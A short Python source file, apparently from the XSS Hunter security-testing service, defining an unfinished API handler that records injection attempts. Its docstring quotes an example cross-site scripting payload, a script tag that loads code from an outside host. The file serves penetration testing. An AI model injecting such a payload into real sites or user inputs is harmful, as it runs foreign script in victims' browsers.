# -*- coding: utf-8 -*-
"""
@author: mandatory, moloch
Copyright 2016
"""

import logging

from handlers.base import APIBaseHandler
from models.user import User
from libs.decorators import json_api


LOGGER = logging.getLogger(__name__)


class ProbeRequestHandler(APIBaseHandler):

    """
    This endpoint is for recording injection attempts.

    It requires the following parameters:

    request - This is the request (note: NOT specific to HTTP) which was performed to
              attempt the injection.
    owner_correlation_key - This is a private key which is used to link the injection
                            to a specific user - displayed in the settings panel.
    injection_key - This is the injection key which the XSS payload uses to identify itself
                    to the XSS Hunter service (<script src=//x.xss.ht/aiwlq></script> where
                    aiwlq is the key)

    Sending two correlation requests means that the previous injection_key entry will be replaced.
    """

    @json_api({
        "type": "object",
        "properites": {
            "correlation_key": {
                "type": "string"
            }
        }
    })
    def post(self):

        pass


